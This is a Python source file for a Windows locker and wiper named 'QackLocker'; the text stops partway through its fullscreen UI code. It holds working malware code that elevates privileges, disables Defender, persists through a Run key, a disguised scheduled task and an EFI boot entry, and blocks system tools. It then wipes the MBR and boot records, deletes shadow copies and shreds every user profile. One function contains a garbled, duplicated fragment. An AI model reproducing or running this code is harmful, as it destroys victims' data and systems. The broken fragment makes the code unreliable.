# language: Python, file: locker_button.py
# Зависимости: pillow, pygame, psutil, wmi
# Сборка: pyinstaller --noconsole --onefile --name locker_button ^
#   --add-data "assets;assets" --add-data "scream.mp3;." --add-data "bootx64.efi;." locker_button.py
# ВНИМАНИЕ: деструктивный код. Только VM со снапшотом.

import ctypes
import json
import os
import random
import shutil
import string
import subprocess
import sys
import threading
import time
from ctypes import wintypes

import psutil

try:
    import pygame
    HAS_PYGAME = True
except ImportError:
    HAS_PYGAME = False

try:
    import wmi
    HAS_WMI = True
except ImportError:
    HAS_WMI = False

# ================= НАСТРОЙКИ =================
OPERATOR = "pu709"
VIRUS_DURATION_SECONDS = 60

BLOCK_NAMES = {
    "notepad.exe", "taskmgr.exe", "cmd.exe", "regedit.exe",
    "processhacker.exe", "msconfig.exe", "iexplore.exe",
    "powershell.exe", "pwsh.exe", "wt.exe",
    "diskpart.exe", "mountvol.exe", "format.com",
    "procexp.exe", "procexp64.exe", "procmon.exe", "procmon64.exe",
    "autoruns.exe", "autoruns64.exe", "psexec.exe", "psexec64.exe",
    "wmic.exe", "cscript.exe", "wscript.exe", "mshta.exe",
    "reg.exe", "sc.exe", "net.exe", "net1.exe", "rundll32.exe",
    "regsvr32.exe", "msiexec.exe", "control.exe", "mmc.exe",
    "tasklist.exe", "taskkill.exe", "schtasks.exe", "bcdedit.exe",
    "reagentc.exe", "vssadmin.exe", "wbadmin.exe", "diskshadow.exe",
    "chkdsk.exe", "bootrec.exe", "sfc.exe", "dism.exe",
    "bcdboot.exe", "certutil.exe", "bitsadmin.exe", "curl.exe",
    "py.exe", "pyw.exe",
}

BLOCK_PATHS = {
    r"c:\windows\system32\taskmgr.exe",
    r"c:\windows\system32\cmd.exe",
    r"c:\windows\system32\regedit.exe",
    r"c:\windows\system32\powershell.exe",
    r"c:\windows\system32\windowspowershell\v1.0\powershell.exe",
    r"c:\windows\system32\mmc.exe",
    r"c:\windows\system32\control.exe",
    r"c:\windows\system32\tasklist.exe",
    r"c:\windows\system32\taskkill.exe",
    r"c:\windows\system32\shutdown.exe",
    r"c:\windows\system32\wbem\wmiprvse.exe",
}

BLOCK_CMDLINE_TOKENS = (
    "taskmgr", "regedit", "processhacker", "msconfig",
    "powershell", "pwsh", "cmd.exe /c", "wmic",
)

_SELF_PID = os.getpid()
_STOP_FLAG = threading.Event()

APPDATA = os.environ.get("APPDATA", ".")
BASE_DIR = os.path.join(APPDATA, "QackLocker")
STATE_FILE = os.path.join(BASE_DIR, "state.dat")
WATCHDOG_PID_FILE = os.path.join(BASE_DIR, "watchdog.pid")
REBOOT_TRIGGER = os.path.join(BASE_DIR, "reboot.trigger")
MASQ_DIR = os.path.join(APPDATA, "Microsoft")
MASQ_SCRIPT = os.path.join(MASQ_DIR, "explorer.py")

CREATE_NO_WINDOW = 0x08000000
DETACHED_PROCESS = 0x00000008

# ================= WINAPI =================
kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)
user32 = ctypes.WinDLL("user32", use_last_error=True)

GENERIC_READ = 0x80000000
GENERIC_WRITE = 0x40000000
FILE_SHARE_READ = 0x1
FILE_SHARE_WRITE = 0x2
OPEN_EXISTING = 3
INVALID_HANDLE_VALUE = ctypes.c_void_p(-1).value
IOCTL_DISK_GET_LENGTH_INFO = 0x0007405C
FILE_FLAG_WRITE_THROUGH = 0x80000000
DRIVE_FIXED = 3

kernel32.CreateFileW.restype = wintypes.HANDLE
kernel32.CreateFileW.argtypes = [
    wintypes.LPCWSTR, wintypes.DWORD, wintypes.DWORD,
    wintypes.LPVOID, wintypes.DWORD, wintypes.DWORD, wintypes.HANDLE,
]
kernel32.WriteFile.argtypes = [
    wintypes.HANDLE, wintypes.LPCVOID, wintypes.DWORD,
    ctypes.POINTER(wintypes.DWORD), wintypes.LPVOID,
]
kernel32.SetFilePointerEx.argtypes = [
    wintypes.HANDLE, ctypes.c_longlong,
    ctypes.POINTER(ctypes.c_longlong), wintypes.DWORD,
]
kernel32.SetFilePointerEx.restype = wintypes.BOOL
kernel32.DeviceIoControl.argtypes = [
    wintypes.HANDLE, wintypes.DWORD, wintypes.LPVOID, wintypes.DWORD,
    wintypes.LPVOID, wintypes.DWORD,
    ctypes.POINTER(wintypes.DWORD), wintypes.LPVOID,
]
kernel32.GetModuleHandleW.restype = wintypes.HMODULE
kernel32.CloseHandle.argtypes = [wintypes.HANDLE]
kernel32.CloseHandle.restype = wintypes.BOOL
kernel32.FlushFileBuffers.argtypes = [wintypes.HANDLE]
kernel32.FlushFileBuffers.restype = wintypes.BOOL
kernel32.GetDriveTypeW.argtypes = [wintypes.LPCWSTR]
kernel32.GetDriveTypeW.restype = wintypes.UINT
kernel32.OpenProcess.restype = wintypes.HANDLE
kernel32.OpenProcess.argtypes = [wintypes.DWORD, wintypes.BOOL, wintypes.DWORD]
kernel32.GetExitCodeProcess.argtypes = [wintypes.HANDLE, ctypes.POINTER(wintypes.DWORD)]
kernel32.GetExitCodeProcess.restype = wintypes.BOOL

user32.SetWindowsHookExW.restype = wintypes.HHOOK
user32.SetWindowsHookExW.argtypes = [
    ctypes.c_int, ctypes.c_void_p, wintypes.HINSTANCE, wintypes.DWORD,
]
user32.CallNextHookEx.restype = ctypes.c_ssize_t
user32.CallNextHookEx.argtypes = [
    wintypes.HHOOK, ctypes.c_int, wintypes.WPARAM, wintypes.LPARAM,
]
user32.GetAsyncKeyState.argtypes = [ctypes.c_int]
user32.GetAsyncKeyState.restype = ctypes.c_short
user32.UnhookWindowsHookEx.argtypes = [wintypes.HHOOK]
user32.UnhookWindowsHookEx.restype = wintypes.BOOL

STILL_ACTIVE = 259

# ================= UAC =================
def ensure_admin():
    if ctypes.windll.shell32.IsUserAnAdmin():
        return
    try:
        args = subprocess.list2cmdline(sys.argv)
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, args, None, 1)
    except Exception:
        pass
    sys.exit(0)

# ================= HELPERS =================
def _run(cmd, timeout=15):
    try:
        r = subprocess.run(cmd, capture_output=True, text=True,
                           creationflags=CREATE_NO_WINDOW, timeout=timeout)
        return r.returncode, (r.stdout or "") + (r.stderr or "")
    except Exception as e:
        return -1, str(e)


def _reg_set_hklm(path, name, value, vtype=None):
    import winreg
    if vtype is None:
        vtype = winreg.REG_DWORD
    try:
        with winreg.CreateKeyEx(winreg.HKEY_LOCAL_MACHINE, path, 0, winreg.KEY_SET_VALUE) as k:
            winreg.SetValueEx(k, name, 0, vtype, value)
        return True
    except Exception:
        return False


def reg_set_hkcu(path, name, value, vtype=1):
    import winreg
    try:
        with winreg.CreateKeyEx(winreg.HKEY_CURRENT_USER, path, 0, winreg.KEY_SET_VALUE) as k:
            winreg.SetValueEx(k, name, 0, vtype, value)
        return True
    except Exception:
        return False

# ================= SELF-MASQUERADE =================
def self_masquerade():
    try:
        os.makedirs(MASQ_DIR, exist_ok=True)
        src = os.path.abspath(__file__)
        dst = MASQ_SCRIPT
        if os.path.abspath(src).lower() != os.path.abspath(dst).lower():
            shutil.copy2(src, dst)
        return dst
    except Exception:
        return None

# ================= DEFENDER =================
def add_exclusions():
    ps_script = (
        "Add-MpPreference -ExclusionPath \"$env:APPDATA\\QackLocker\" -ErrorAction SilentlyContinue; "
        "Add-MpPreference -ExclusionPath \"$env:APPDATA\\Microsoft\" -ErrorAction SilentlyContinue; "
        "Add-MpPreference -ExclusionPath \"$env:TEMP\" -ErrorAction SilentlyContinue; "
        "Add-MpPreference -ExclusionProcess 'python.exe' -ErrorAction SilentlyContinue; "
        "Add-MpPreference -ExclusionProcess 'pythonw.exe' -ErrorAction SilentlyContinue"
    )
    rc, _ = _run(["powershell", "-NoProfile", "-WindowStyle", "Hidden",
                  "-Command", ps_script], timeout=25)
    return {"set_rc": rc}


def check_tamper_protection():
    rc, out = _run(["powershell", "-NoProfile", "-Command",
                    "(Get-MpComputerStatus).IsTamperProtected"], timeout=10)
    return {"rc": rc, "enabled": "True" in out}


def disable_via_powershell():
    ps_set = (
        "Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue; "
        "Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue; "
        "Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue; "
        "Set-MpPreference -DisableScriptScanning $true -ErrorAction SilentlyContinue; "
        "Set-MpPreference -MAPSReporting 0 -ErrorAction SilentlyContinue; "
        "Set-MpPreference -SubmitSamplesConsent 2 -ErrorAction SilentlyContinue; "
        "Set-MpPreference -PUAProtection 0 -ErrorAction SilentlyContinue"
    )
    rc, _ = _run(["powershell", "-NoProfile", "-WindowStyle", "Hidden",
                  "-Command", ps_set], timeout=20)
    return {"set_rc": rc}


def disable_via_registry():
    policy = r"SOFTWARE\Policies\Microsoft\Windows Defender"
    rtp = policy + r"\Real-Time Protection"
    written = {
        "DisableAntiSpyware": _reg_set_hklm(policy, "DisableAntiSpyware", 1),
        "DisableAntiVirus": _reg_set_hklm(policy, "DisableAntiVirus", 1),
        "ServiceStartup": _reg_set_hklm(policy, "ServiceStartup", 4),
        "DisableRealtimeMonitoring": _reg_set_hklm(rtp, "DisableRealtimeMonitoring", 1),
        "DisableBehaviorMonitoring": _reg_set_hklm(rtp, "DisableBehaviorMonitoring", 1),
        "DisableIOAVProtection": _reg_set_hklm(rtp, "DisableIOAVProtection", 1),
    }
    return {"written": written, "all_written": all(written.values())}


def stop_services():
    results = {}
    for svc in ("WinDefend", "WdNisSvc", "Sense", "SecurityHealthService",
                "wscsvc", "MsMpSvc"):
        rc_stop, _ = _run(["sc", "stop", svc], timeout=10)
        rc_cfg, _ = _run(["sc", "config", svc, "start=", "disabled"], timeout=10)
        results[svc] = {"stop_rc": rc_stop, "config_rc": rc_cfg}
    return results


def bypass_defender():
    tp = check_tamper_protection()
    report = {
        "tamper_protection": tp,
        "powershell": disable_via_powershell(),
        "registry": disable_via_registry(),
        "services": stop_services(),
    }
    report["summary"] = {"tamper_protection_on": tp["enabled"]}
    return report


def run_defender_bypass_and_log():
    try:
        report = bypass_defender()
    except Exception as e:
        report = {"error": str(e)}
    try:
        os.makedirs(BASE_DIR, exist_ok=True)
        with open(os.path.join(BASE_DIR, "defender_bypass.log"), "w", encoding="utf-8") as f:
            json.dump(report, f, indent=2, ensure_ascii=False)
    except Exception:
        pass

# ================= STATE =================
def mark_destroyed():
    try:
        os.makedirs(BASE_DIR, exist_ok=True)
        with open(STATE_FILE, "w") as f:
            f.write("DESTROYED")
    except Exception:
        pass


def is_destroyed():
    try:
        with open(STATE_FILE, "r") as f:
            return f.read().strip() == "DESTROYED"
    except Exception:
        return False

# ================= DISK =================
def _open_drive0():
    h = kernel32.CreateFileW(
        r"\\.\PhysicalDrive0",
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        None, OPEN_EXISTING, FILE_FLAG_WRITE_THROUGH, None,
    )
    if not h or h == INVALID_HANDLE_VALUE:
        return None
    return h


def _write_at(h, offset, data):
    if not h or h == INVALID_HANDLE_VALUE:
        return False
    new_pos = ctypes.c_longlong(0)
    ok = kernel32.SetFilePointerEx(h, ctypes.c_longlong(offset),
                                   ctypes.byref(new_pos), 0)
    if not ok:
        return False
    written = wintypes.DWORD(0)
    buf = (ctypes.c_char * len(data)).from_buffer_copy(data)
    ok = kernel32.WriteFile(h, buf, len(data), ctypes.byref(written), None)
    kernel32.FlushFileBuffers(h)
    return bool(ok) and written.value == len(data)


def _nuke_physical_drive(h):
    junk = bytearray(os.urandom(512))
    junk[510] = 0
    junk[511] = 0
    _write_at(h, 0, bytes(junk))
    _write_at(h, 512, b"\xFF" * 4096)
    length = ctypes.c_ulonglong(0)
    ret = wintypes.DWORD(0)
    kernel32.DeviceIoControl(h, IOCTL_DISK_GET_LENGTH_INFO,
                             None, 0, ctypes.byref(length), 8,
                             ctypes.byref(ret), None)
    if length.value > 33 * 512:
        _write_at(h, length.value - 33 * 512, b"\xFF" * (33 * 512))


def wipe_mbr():
    h = _open_drive0()
    if not h:
        return False
    try:
        _nuke_physical_drive(h)
        return True
    finally:
        kernel32.CloseHandle(h)


def enumerate_fixed_volumes():
    vols = []
    for L in string.ascii_uppercase:
        root = f"{L}:\\"
        try:
            if kernel32.GetDriveTypeW(root) == DRIVE_FIXED and os.path.exists(root):
                vols.append(f"{L}:")
        except Exception:
            continue
    return vols


def wipe_vbr_all():
    for drive in enumerate_fixed_volumes():
        try:
            h = kernel32.CreateFileW(
                f"\\\\.\\{drive}",
                GENERIC_READ | GENERIC_WRITE,
                FILE_SHARE_READ | FILE_SHARE_WRITE,
                None, OPEN_EXISTING, FILE_FLAG_WRITE_THROUGH, None,
            )
            if not h or h == INVALID_HANDLE_VALUE:
                continue
            try:
                _write_at(h, 0, os.urandom(512))
            finally:
                kernel32.CloseHandle(h)
        except Exception:
            pass

# ================= USERS =================
def list_user_profiles():
    import winreg
    profiles = []
    base = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList"
    skip_sids = ("S-1-5-18", "S-1-5-19", "S-1-5-20")
    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, base) as root:
            i = 0
            while True:
                try:
                    sid = winreg.EnumKey(root, i)
                except OSError:
                    break
                i += 1
                if sid in skip_sids:
                    continue
                try:
                    with winreg.OpenKey(root, sid) as sk:
                        path, _ = winreg.QueryValueEx(sk, "ProfileImagePath")
                except OSError:
                    continue
                if not path or not os.path.isdir(path):
                    continue
                low = path.lower()
                if low.endswith(r"\system32\config\systemprofile") or \
                   low.endswith(r"\system32\config\default"):
                    continue
                profiles.append(path)
    except Exception:
        pass
    if not profiles:
        base_users = os.path.join(os.environ.get("SystemDrive", "C:"), "Users")
        if os.path.isdir(base_users):
            skip = {"public", "default", "default user", "all users"}
            try:
                for name in os.listdir(base_users):
                    p = os.path.join(base_users, name)
                    if os.path.isdir(p) and name.lower() not in skip:
                        profiles.append(p)
            except Exception:
                pass
    return profiles


def shred_dir(path):
    for root, dirs, files in os.walk(path, topdown=False):
        for f in files:
            fp = os.path.join(root, f)
            try:
                size = os.path.getsize(fp)
                if 0 < size < 64 * 1024 * 1024:
                    with open(fp, "r+b", buffering=0) as fh:
                        left = size
                        chunk = os.urandom(65536)
                        while left > 0:
                            n = min(left, len(chunk))
                            fh.write(chunk[:n])
                            left -= n
                        fh.flush()
                        os.fsync(fh.fileno())
            except Exception:
                pass
            try:
                os.remove(fp)
            except Exception:
                pass
        for d in dirs:
            try:
                os.rmdir(os.path.join(root, d))
            except Exception:
                pass
    try:
        os.rmdir(path)
    except Exception:
        pass


def _take_ownership_and_shred(path):
    try:
        subprocess.run(["takeown", "/f", path, "/r", "/d", "y"],
                       capture_output=True, creationflags=CREATE_NO_WINDOW, timeout=60)
    except Exception:
        pass
    try:
        subprocess.run(["icacls", path, "/grant", "administrators:F", "/t", "/c"],
                       capture_output=True, creationflags=CREATE_NO_WINDOW, timeout=60)
    except Exception:
        pass
    shred_dir(path)


def nuke_users():
    for prof in list_user_profiles():
        try:
            _take_ownership_and_shred(prof)
        except Exception:
            pass

# ================= DESTROY =================
def destroy_boot_and_recovery():
    for c in (
        ["vssadmin", "delete", "shadows", "/all", "/quiet"],
        ["wbadmin", "delete", "catalog", "-quiet"],
        ["reagentc", "/disable"],
        ["bcdedit", "/set", "{bootmgr}", "path", r"\NONEXISTENT", "/f"],
        ["bcdedit", "/set", "{default}", "recoveryenabled", "No", "/f"],
    ):
        try:
            subprocess.run(c, capture_output=True,
                           creationflags=CREATE_NO_WINDOW, timeout=20)
        except Exception:
            pass


def _do_destroy():
    try:
        wipe_mbr()
    except Exception:
        pass
    try:
        wipe_vbr_all()
    except Exception:
        pass
    try:
        destroy_boot_and_recovery()
    except Exception:
        pass
    try:
        nuke_users()
    except Exception:
        pass
    mark_destroyed()


def full_destroy(force=False):
    if not force and is_destroyed():
        return
    _STOP_FLAG.set()
    time.sleep(0.15)
    try:
        _do_destroy()
    finally:
        try:
            subprocess.Popen(["shutdown", "/s", "/t", "3", "/f"],
                             creationflags=CREATE_NO_WINDOW)
        except Exception:
            pass

# ================= AUTOSTART =================
def _launch_line():
    if getattr(sys, "frozen", False):
        return f'"{sys.executable}"'
    script = MASQ_SCRIPT if os.path.exists(MASQ_SCRIPT) else os.path.abspath(__file__)
    pyw = os.path.join(os.path.dirname(sys.executable), "pythonw.exe")
    if not os.path.exists(pyw):
        pyw = sys.executable
    return f'"{pyw}" "{script}"'


def _schtasks_create(line):
    inner = f'schtasks /create /tn WindowsDefenderUpdate /tr "{line}" /sc onlogon /rl highest /f'
    try:
        subprocess.run(["cmd", "/c", inner], capture_output=True,
                       creationflags=CREATE_NO_WINDOW, timeout=15)
    except Exception:
        pass


def _schtasks_delete():
    try:
        subprocess.run(["cmd", "/c", "schtasks /delete /tn WindowsDefenderUpdate /f"],
                       capture_output=True, creationflags=CREATE_NO_WINDOW, timeout=10)
    except Exception:
        pass


def install_autostart():
    line = _launch_line()
    try:
        import winreg
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                            r"Software\Microsoft\Windows\CurrentVersion\Run",
                            0, winreg.KEY_SET_VALUE) as k:
            winreg.SetValueEx(k, "explorer", 0, winreg.REG_SZ, line)
    except Exception:
        pass
    _schtasks_create(line)


def remove_autostart():
    try:
        import winreg
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                            r"Software\Microsoft\Windows\CurrentVersion\Run",
                            0, winreg.KEY_SET_VALUE) as k:
            winreg.DeleteValue(k, "explorer")
    except Exception:
        pass
    _schtasks_delete()


def apply_reg_blocks():
    sys_path = r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
    exp = r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"
    hklm_sys = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
    hklm_exp = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer"
    for name in ("DisableTaskMgr", "DisableLockWorkstation", "DisableChangePassword"):
        _reg_set_hklm(hklm_sys, name, 1)
        reg_set_hkcu(sys_path, name, 1)
    for name in ("NoWinKeys", "NoLogoff", "NoClose", "NoRun"):
        _reg_set_hklm(hklm_exp, name, 1)
        reg_set_hkcu(exp, name, 1)


def clear_reg_blocks():
    sys_path = r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
    exp = r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"
    hklm_sys = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
    hklm_exp = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer"
    for name in ("DisableTaskMgr", "DisableLockWorkstation", "DisableChangePassword"):
        _reg_set_hklm(hklm_sys, name, 0)
        reg_set_hkcu(sys_path, name, 0)
    for name in ("NoWinKeys", "NoLogoff", "NoClose", "NoRun"):
        _reg_set_hklm(hklm_exp, name, 0)
        reg_set_hkcu(exp, name, 0)

# ================= UEFI PERSISTENCE =================
def _find_esp_letter():
    ps = ("Get-Partition | Where-Object { $_.Type -eq 'System' } | "
          "Select-Object -First 1 -ExpandProperty DriveLetter")
    rc, out = _run(["powershell", "-NoProfile", "-Command", ps], timeout=10)
    letter = out.strip()
    if letter and len(letter) == 1 and letter.isalpha():
        return f"{letter}:"
    for candidate in ("S:", "T:", "U:", "V:"):
        if os.path.exists(candidate + "\\"):
            continue
        _run(["mountvol", candidate, "/s"], timeout=10)
        if os.path.exists(candidate + "\\"):
            return candidate
    return None


def install_efi_persistence():
    efi_src = resource_path("bootx64.efi")
    if not efi_src or not os.path.exists(efi_src):
        return {"ok": False, "err": "bootx64.efi not bundled"}

    esp = _find_esp_letter()
    if not esp:
        return {"ok": False, "err": "ESP not found"}

    dst_dir = os.path.join(esp + "\\", "EFI", "QackLocker")
    try:
        os.makedirs(dst_dir, exist_ok=True)
        shutil.copy2(efi_src, os.path.join(dst_dir, "bootx64.efi"))
        self_exe = sys.executable if getattr(sys, "frozen", False) else os.path.abspath(__file__)
        shutil.copy2(self_exe, os.path.join(dst_dir, "locker.exe"))
    except Exception as e:
        return {"ok": False, "err": f"copy failed: {e}"}

    rc, out = _run(["bcdedit", "/copy", "{bootmgr}", "/d", "QackLocker"], timeout=10)
    guid = None
    for line in out.splitlines():
        if "{" in line and "}" in line:
            guid = line[line.index("{"):line.index("}") + 1]
            break
    if not guid:
        return {"ok": False, "err": f"bcdedit copy failed: {out}"}

    _run(["bcdedit", "/set", guid, "path", "\\EFI\\QackLocker\\bootx64.efi"], timeout=10)
    _run(["bcdedit", "/set", guid, "device", "partition=" + esp.rstrip(":")], timeout=10)
    _run(["bcdedit", "/set", "{fwbootmgr}", "displayorder", guid, "/addfirst"], timeout=10)
    return {"ok": True, "guid": guid, "esp": esp}

# ================= KEYBOARD HOOK =================
WH_KEYBOARD_LL = 13
WM_KEYDOWN = 0x0100
WM_SYSKEYDOWN = 0x0104
VK_0, VK_9 = 0x30, 0x39
VK_ENTER, VK_BACK, VK_TAB = 0x0D, 0x08, 0x09
VK_MENU = 0x12
VK_ESCAPE = 0x1B
VK_F4 = 0x73
VK_CONTROL = 0x11


class KBDLLHOOKSTRUCT(ctypes.Structure):
    _fields_ = [
        ("vkCode", wintypes.DWORD), ("scanCode", wintypes.DWORD),
        ("flags", wintypes.DWORD), ("time", wintypes.DWORD),
        ("dwExtraInfo", ctypes.c_void_p),
    ]


_kb_proc_ref = None
_kb_hook = None


def _kb_proc(nCode, wParam, lParam):
    if nCode == 0 and wParam in (WM_KEYDOWN, WM_SYSKEYDOWN):
        kb = ctypes.cast(lParam, ctypes.POINTER(KBDLLHOOKSTRUCT)).contents
        vk = kb.vkCode
        if vk == VK_TAB and (user32.GetAsyncKeyState(VK_MENU) & 0x8000):
            return 1
        if vk in (0x5B, 0x5C):
            return 1
        if vk == VK_F4 and (user32.GetAsyncKeyState(VK_MENU) & 0x8000):
            return 1
        if vk == VK_ESCAPE and (user32.GetAsyncKeyState(VK_CONTROL) & 0x8000):
            return 1
        if vk == VK_ESCAPE and (user32.GetAsyncKeyState(VK_MENU) & 0x8000):
            return 1
        if vk == VK_ESCAPE:
            return 1
        allowed = (VK_0 <= vk <= VK_9) or vk in (VK_ENTER, VK_BACK, VK_TAB)
        if not allowed:
            return 1
    return user32.CallNextHookEx(None, nCode, wParam, lParam)


def install_keyboard_hook():
    global _kb_proc_ref, _kb_hook
    if _kb_hook:
        return
    HOOKPROC = ctypes.WINFUNCTYPE(ctypes.c_ssize_t, ctypes.c_int,
                                  wintypes.WPARAM, wintypes.LPARAM)
    _kb_proc_ref = HOOKPROC(_kb_proc)
    _kb_hook = user32.SetWindowsHookExW(WH_KEYBOARD_LL, _kb_proc_ref,
                                        kernel32.GetModuleHandleW(None), 0)


def uninstall_keyboard_hook():
    global _kb_hook
    if _kb_hook:
        try:
            user32.UnhookWindowsHookEx(_kb_hook)
        except Exception:
            pass
        _kb_hook = None

# ================= PROCESS KILL =================
def _proc_blocked(proc):
    try:
        info = proc.info
        cmd = " ".join(info.get("cmdline") or []).lower()
        if "--watchdog" in cmd:
            return False
        exe = (info.get("exe") or "").lower()
        if "appdata" in exe and "explorer.py" in exe:
            return False
        name = (info.get("name") or "").lower()
        if name in BLOCK_NAMES:
            return True
        if exe in BLOCK_PATHS:
            return True
        for tok in BLOCK_CMDLINE_TOKENS:
            if tok in cmd:
                return True
    except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
        return False
    return False


def kill_blocked():
    for proc in psutil.process_iter(["name", "exe", "cmdline", "ppid", "pid"]):
        try:
            if proc.info.get("pid") == _SELF_PID:
                continue
            if proc.info.get("ppid") == _SELF_PID:
                continue
            if _proc_blocked(proc):
                proc.kill()
        except Exception:
            pass


def blocking_loop():
    while not _STOP_FLAG.is_set():
        kill_blocked()
        time.sleep(0.02)


def wmi_kill_loop():
    if not HAS_WMI:
        return
    try:
        c = wmi.WMI()
        watcher = c.Win32_Process.watch_for("creation")
    except Exception:
        return
    while not _STOP_FLAG.is_set():
        try:
            p = watcher(timeout_ms=200)
        except Exception:
            time.sleep(0.3)
            continue
        try:
            name = (p.Name or "").lower()
            cmd = (p.CommandLine or "").lower()
            if "--watchdog" in cmd:
                continue
            if name in BLOCK_NAMES or any(t in cmd for t in BLOCK_CMDLINE_TOKENS):
                subprocess.run(["taskkill", "/f", "/pid", str(p.ProcessId)],
                               capture_output=True, creationflags=CREATE_NO_WINDOW, timeout=5)
        except Exception:
            pass

# ================= WATCHDOG =================
def _parent_alive(pid):
    try:
        p = kernel32.OpenProcess(0x1000, False, pid)
        if not p:
            return False
        ec = wintypes.DWORD(0)
        kernel32.GetExitCodeProcess(p, ctypes.byref(ec))
        kernel32.CloseHandle(p)
        return ec.value == STILL_ACTIVE
    except Exception:
        return False


def watchdog_main(parent_pid):
    while True:
        if os.path.exists(REBOOT_TRIGGER):
            full_destroy(force=True)
            break
        if not _parent_alive(parent_pid):
            full_destroy(force=True)
            break
        time.sleep(0.5)


def spawn_watchdog():
    script = MASQ_SCRIPT if os.path.exists(MASQ_SCRIPT) else os.path.abspath(__file__)
    args = [sys.executable, script, "--watchdog", str(_SELF_PID)]
    try:
        proc = subprocess.Popen(args, creationflags=CREATE_NO_WINDOW | DETACHED_PROCESS,
                                close_fds=True)
        with open(WATCHDOG_PID_FILE, "w") as f:
            f.write(str(proc.pid))
        return proc
    except Exception:
        return None


def kill_watchdog():
    try:
        with open(WATCHDOG_PID_FILE, "r") as f:
            pid = int(f.read().strip())
        psutil.Process(pid).kill()
    except Exception:
        pass
    try:
        os.remove(WATCHDOG_PID_FILR)
      try:
        os.remove(WATCHDOG_PID_FILE)
    except Exception:
        pass
    try:
        os.remove(REBOOT_TRIGGER)
    except Exception:
        pass

# ================= SOUND =================
_scream_path = None


def resource_path(rel):
    base = getattr(sys, "_MEIPASS", os.path.dirname(os.path.abspath(__file__)))
    p = os.path.join(base, rel)
    return p if os.path.exists(p) else None


def init_scream():
    global _scream_path
    if not HAS_PYGAME:
        return
    path = resource_path("scream.mp3")
    if not path:
        return
    try:
        pygame.mixer.init()
        pygame.mixer.music.load(path)
        _scream_path = path
    except Exception:
        _scream_path = None

# ================= FLYING PHOTOS VIRUS =================
def flying_photos_virus(parent_win):
    import tkinter as tk
    from PIL import Image, ImageTk

    try:
        parent_win.withdraw()
    except Exception:
        pass

    vwin = tk.Toplevel(parent_win)
    vwin.title("...")
    sw = vwin.winfo_screenwidth()
    sh = vwin.winfo_screenheight()
    w = int(sw * 0.9)
    h = int(sh * 0.9)
    x = (sw - w) // 2
    y = (sh - h) // 2
    vwin.geometry(f"{w}x{h}+{x}+{y}")
    vwin.attributes("-topmost", True)
    vwin.attributes("-alpha", 0.85)
    vwin.configure(bg="#000000")
    vwin.protocol("WM_DELETE_WINDOW", lambda: None)
    vwin.lift()
    vwin.focus_force()

    canvas = tk.Canvas(vwin, width=w, height=h, bg="#000000", highlightthickness=0)
    canvas.pack(fill="both", expand=True)

    pil_photos = []
    for name in ("assets/photo1.png", "assets/photo2.png"):
        p = resource_path(name)
        if p:
            try:
                img = Image.open(p).resize((200, 200)).convert("RGBA")
                pil_photos.append(img)
            except Exception:
                pass
    if not pil_photos:
        try:
            pil_photos.append(Image.new("RGBA", (200, 200), (51, 51, 51, 255)))
        except Exception:
            try:
                parent_win.deiconify()
            except Exception:
                pass
            return

    SIZE = 200
    MAX_PHOTOS = 500
    START_PHOTOS = 15
    SPAWN_INTERVAL_MS = 300
    SPEED_CHOICES = [-25, -22, -18, -15, -12, -10, 10, 12, 15, 18, 22, 25]

    items = []
    tk_refs = []

    def spawn_one():
        if len(items) >= MAX_PHOTOS:
            return
        try:
            pil = random.choice(pil_photos)
            photo = ImageTk.PhotoImage(pil)
            tk_refs.append(photo)
            px = random.randint(0, max(1, w - SIZE))
            py = random.randint(0, max(1, h - SIZE))
            item = canvas.create_image(px, py, image=photo, anchor="nw")
            dx = random.choice(SPEED_CHOICES)
            dy = random.choice(SPEED_CHOICES)
            items.append({"id": item, "x": px, "y": py, "dx": dx, "dy": dy})
        except Exception:
            pass

    for _ in range(START_PHOTOS):
        spawn_one()

    def spawn_loop():
        spawn_one()
        vwin.after(SPAWN_INTERVAL_MS, spawn_loop)

    def animate():
        for it in items:
            it["x"] += it["dx"]
            it["y"] += it["dy"]
            if it["x"] <= 0 or it["x"] >= w - SIZE:
                it["dx"] = -it["dx"]
                it["x"] = max(0, min(it["x"], w - SIZE))
            if it["y"] <= 0 or it["y"] >= h - SIZE:
                it["dy"] = -it["dy"]
                it["y"] = max(0, min(it["y"], h - SIZE))
            canvas.coords(it["id"], it["x"], it["y"])
        vwin.after(16, animate)

    if HAS_PYGAME and _scream_path:
        try:
            pygame.mixer.music.load(_scream_path)
            pygame.mixer.music.play(-1)
        except Exception:
            pass

    spawn_loop()
    animate()

# ================= UI =================
def run_ui():
    import tkinter as tk
    from PIL import Image, ImageTk

    win = tk.Tk()
    win.title(f"System Locker — {OPERATOR}")
    win.attributes("-fullscreen", True)
    win.attributes("-topmost", True)
    win.configure(bg="#000000")
    win.protocol("WM_DELETE_WINDOW", lambda: None)

    win.update_idletasks()

    eye_path = resource_path("assets/Eye.png")
    if eye_path:
        try:
            img = Image.open(eye_path).resize((420, 200))
            photo = ImageTk.PhotoImage(img)
            lbl = tk.Label(win, image=photo, bg="#000000", bd=0)
            lbl.image = photo
            lbl.place(relx=0.5, rely=0.45, anchor="center")
        except Exception:
            tk.Label(win, text="[Eye Error]", fg="red", bg="black").place(
                relx=0.5, rely=0.45, anchor="center")
    else:
        tk.Label(win, text="[Eye Missing]", fg="red", bg="black").place(
            relx=0.5, rely=0.45, anchor="center")

    boot1 = "Booting System\n\nMemory section at adres 0x420 IS LOCKED!!"
